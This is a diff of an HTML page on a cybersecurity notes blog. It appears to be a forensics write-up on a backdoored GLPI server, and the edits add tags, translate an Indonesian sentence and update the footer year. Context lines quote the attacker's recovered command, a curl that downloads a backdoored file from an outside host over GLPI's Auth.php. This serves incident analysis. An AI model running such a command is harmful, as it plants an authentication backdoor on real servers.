@@ -77,6 +77,10 @@
           
             <span class="tag-chip">ActiveDirectory</span>
           
+            <span class="tag-chip">DiskForensics</span>
+          
+            <span class="tag-chip">MemoryForensics</span>
+          
             <span class="tag-chip">DCsync</span>
           
             <span class="tag-chip">GLPI</span>
@@ -452,7 +456,7 @@ oGAHt/Kk1OKeXWxy7iXUfw==;
 <span class="o">[</span>2] curl https://xthaz.fr/glpi_auth_backdoored.php <span class="o">&gt;</span> /var/www/glpi/src/Auth.php
 <span class="o">[</span>3] <span class="nb">whoami</span>
 </code></pre></div></div>
-<p>Jadi dari sini sudah kelihatan bagaimana bisa terjadi backdoor yaitu attacker melakukan overwriting pada Auth.php</p>
+<p>This explains how the backdoor was planted, where the attacker overwrote the <code class="language-plaintext highlighter-rouge">Auth.php</code> file.</p>
 
 <h3 id="absolute-path-of-file-used-to-backdoor-auth">Absolute Path of File Used to Backdoor Auth</h3>
 <p>The decrypted commands clearly show how the backdoor was deployed:</p>
@@ -468,7 +472,7 @@ oGAHt/Kk1OKeXWxy7iXUfw==;
 <p>To further understand how the backdoor was registered, the glpi_plugins table needed to be analyzed.
 Since only a filesystem dump was provided, the database had to be recovered offline.</p>
 
-<p>The MariaDB version in use was identified from the mysql_upgrade_info file as 10.11.14-MariaDB.
+<p>The MariaDB version in use was identified from the <code class="language-plaintext highlighter-rouge">mysql_upgrade_info</code> file as 10.11.14-MariaDB.
 To ensure compatibility, a MariaDB container with a matching version was launched and the original data directory was mounted:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-it</span> <span class="nt">--rm</span> <span class="se">\</span>
@@ -1048,7 +1052,7 @@ This strongly indicates that:</p>
 
     <footer class="site-footer">
       <div class="wrapper footer-inner">
-        <div class="footer-note-left">&copy; 2025 Jay's Cybersecurity Notes.</div>
+        <div class="footer-note-left">&copy; 2026 Jay's Cybersecurity Notes.</div>
       </div>
     </footer>
     <script>
